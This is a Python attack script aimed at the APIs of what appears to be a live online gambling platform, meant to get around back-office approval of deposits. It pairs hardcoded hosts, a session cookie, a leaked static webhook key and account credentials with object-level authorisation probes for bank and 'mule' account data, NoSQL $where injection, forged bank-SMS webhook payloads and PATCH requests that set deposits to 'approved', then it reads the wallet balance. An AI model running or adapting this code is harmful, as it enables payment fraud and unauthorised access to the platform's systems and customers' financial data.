#!/usr/bin/env python3
"""probe_bypass_approve.py — Find every path to bypass BO admin approval.

   Fresh deposit tx_ref: 016282212408DTF71867 (HTTP 200 success, in BO queue)

   Bypass vectors:
   1. Webhook injection with static PAPDIEAW-KEY (no C2 needed)
   2. BOLA on bgapi bank-info endpoints → get mule bank_no
   3. pbapi NoSQL $where → update deposit status
   4. pbapi service collections → find deposit TX + PATCH
   5. mgapi internal approval endpoints
"""
import base64, json, pathlib, requests, time, uuid

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
BANK_INFO = "18a9502b-94ae-4188-8841-094be8b3b974"

# From exploit_webhook_inject.py
PAPDIEAW_KEY = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"

# Fresh queued deposit
FRESH_TX_REF = "016282212408DTF71867"
FRESH_QR     = "0041000600000101030040220016282212408DTF718675102TH91044B59"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}")
print(f"Fresh deposit tx_ref: {FRESH_TX_REF}\n")

# ── 1. BOLA: get mule bank_no via bgapi ──────────────────────────────────────
print("=== 1. BOLA: bgapi bank/mule info ===")
bo_bank_no = None
for path in ["/bo/info/bank-account", "/bo/info/bank-information",
             "/bo/info/payment-bank-information", "/bo/info/mule",
             "/bo/info/bank", "/bo/bank-account",
             "/bo/info/deposit-bank-information",
             f"/bo/info/payment-bank-information/{BANK_INFO}"]:
    r = requests.get(f"{BGAPI}{path}",
                     headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                     params={"domain": DOMAIN},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:300]}")
        if r.ok:
            try:
                data = r.json()
                # Try to extract bank_no
                items = data.get("data", [data]) if isinstance(data, dict) else [data] if isinstance(data, dict) else data
                for item in (items if isinstance(items, list) else [items]):
                    if isinstance(item, dict) and "bank_no" in item:
                        bo_bank_no = item["bank_no"]
                        print(f"  [!!!] Found bank_no: {bo_bank_no}")
            except Exception:
                pass
    time.sleep(0.3)

# ── 2. pbapi NoSQL: find bank info in MongoDB ──────────────────────────────────
print("\n=== 2. pbapi NoSQL: probe bank-info collections ===")
pb_hdr = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
for service in ["payment-bank-informations", "payment_bank_informations",
                "bank-informations", "bank_informations",
                "bank-accounts", "bank_accounts", "mule-accounts"]:
    r = requests.get(f"{PBAPI}/pb/{service}",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$limit": 10},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET /pb/{service}: HTTP {r.status_code}: {r.text[:300]}")
        if r.ok:
            try:
                items = r.json().get("data", [])
                for item in items[:3]:
                    if "bank_no" in item:
                        bo_bank_no = item["bank_no"]
                        print(f"  bank_no: {bo_bank_no}, id: {item.get('id','?')[:8]}")
            except Exception:
                pass

# NoSQL injection to read bank collections
print("\n  → NoSQL $where on latest-win (find bank_no patterns):")
for q in ["this.bank_no.length>5", "this.mule_no!=null", "this.account_no!=null"]:
    r = requests.get(f"{PBAPI}/pb/latest-win",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$where": q, "$limit": 5},
                     timeout=10)
    if r.ok:
        try:
            data = r.json()
            items = data if isinstance(data, list) else data.get("data", [])
            if items:
                print(f"  [{q[:30]}] {len(items)} records: {str(items[0])[:200]}")
        except Exception:
            pass

# ── 3. Webhook injection with static PAPDIEAW-KEY ────────────────────────────
print("\n=== 3. Webhook injection (PAPDIEAW-KEY) ===")
# Try with all known bank_no candidates
bank_no_candidates = [
    bo_bank_no,           # from BOLA (if found)
    "0543753327",         # KBANK mule from we88c/vak88z2 deposit scripts
    "66655379482",        # TrueWallet from vak88z2 pending deposits
    "0655379482",         # normalized TW
    "0972571110",         # player's own phone
    "",                   # empty (platform might not check)
]
bank_no_candidates = [b for b in bank_no_candidates if b is not None]

wh_hdr = {
    "Content-Type": "application/json",
    "PAPDIEAW-KEY": PAPDIEAW_KEY,
    "User-Agent": "okhttp/3.12.1",
}

sms_variants = [
    # KBANK PromptPay
    {
        "address": "K-Bank",
        "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
        "endpoint": "/webhook-sms",
        "label": "KBank PromptPay /webhook-sms",
    },
    {
        "address": "K-Bank",
        "message": f"KBank: รับโอน 500.00 บาท Ref.{FRESH_TX_REF}",
        "endpoint": "/webhook-kbank",
        "label": "KBank direct /webhook-kbank",
    },
    # TrueWallet
    {
        "address": "TrueMove H",
        "message": f"TrueMoney Wallet: รับเงิน 500.00 บาท จาก ****1110 Ref. {FRESH_TX_REF[:10]}",
        "endpoint": "/webhooks/sms/truewallet",
        "label": "TrueWallet",
    },
]

for bank_no in bank_no_candidates[:3]:  # limit to first 3 candidates
    for sms in sms_variants:
        ts = int(time.time() * 1000)
        payload = {
            "address":   sms["address"],
            "message":   sms["message"],
            "timestamp": ts,
            "bank_no":   bank_no or "",
            "sms_id":    f"sms-{uuid.uuid4().hex[:8]}",
            "type":      "sms_deposit",
            "bank_code": "KBANK" if "truewallet" not in sms["endpoint"] else "TRUEWALLET",
        }
        if "truewallet" in sms["endpoint"]:
            payload["phone_owner"] = bank_no or ""
            payload["phone_number"] = "0972571110"

        r = requests.post(f"{MGAPI}{sms['endpoint']}",
                          headers=wh_hdr,
                          json=payload,
                          timeout=12)
        print(f"  [{sms['label']}] bank_no={str(bank_no)[:12]:12} "
              f"→ HTTP {r.status_code}: {r.text[:100]}")
        if r.status_code in (200, 201) and "success" in r.text.lower():
            print(f"  [!!!] WEBHOOK SUCCESS!")
            time.sleep(5)
            print(f"  wallet: {wallet()}")
        time.sleep(0.3)

# ── 4. pbapi: find deposit transactions and PATCH ─────────────────────────────
print("\n=== 4. pbapi deposit tx lookup + PATCH ===")
for service in ["deposit-transactions", "deposits", "deposit_transactions"]:
    r = requests.get(f"{PBAPI}/pb/{service}",
                     headers=pb_hdr,
                     params={"domain": DOMAIN, "$limit": 5},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  GET /pb/{service}: HTTP {r.status_code}: {r.text[:300]}")
        if r.ok:
            try:
                items = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
                for item in items[:3]:
                    tx_id = item.get("id")
                    status = item.get("status")
                    print(f"    TX {tx_id} status={status}")
                    if tx_id and status != "approved":
                        pr = requests.patch(f"{PBAPI}/pb/{service}/{tx_id}",
                                            headers=pb_hdr,
                                            json={"status": "approved"},
                                            timeout=10)
                        print(f"    PATCH {tx_id[:8]} → {pr.status_code}: {pr.text[:100]}")
            except Exception as e:
                print(f"    parse error: {e}")

# ── 5. mgapi: try deposit confirmation endpoints ──────────────────────────────
print("\n=== 5. mgapi confirm/approve deposit ===")
for path, payload in [
    ("/mb/deposit-transaction/confirm", {"qr_string": FRESH_QR, "amount": 500}),
    ("/mb/deposit-transaction/approve", {"deposit_id": "latest", "status": "approved"}),
    ("/mb/confirm-slip", {"qr_string": FRESH_QR}),
    ("/mb/auto-confirm-deposit", {"qr_string": FRESH_QR, "amount": 500}),
]:
    r = requests.post(f"{MGAPI}{path}", headers=HDR, json=payload, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  POST {path}: 404")

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
